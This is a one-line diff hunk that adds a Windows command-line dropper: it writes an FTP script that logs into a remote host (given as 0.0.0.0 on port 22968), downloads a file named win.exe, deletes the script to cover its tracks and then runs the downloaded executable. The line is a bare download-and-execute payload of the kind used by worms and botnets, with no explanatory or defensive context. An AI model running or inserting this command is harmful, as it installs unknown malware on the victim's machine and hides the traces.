@@ -1,0 +1,1 @@
+cmd /c echo open 0.0.0.0 22968 >> ii &echo user 1 1 >> ii &echo get win.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &win.exe
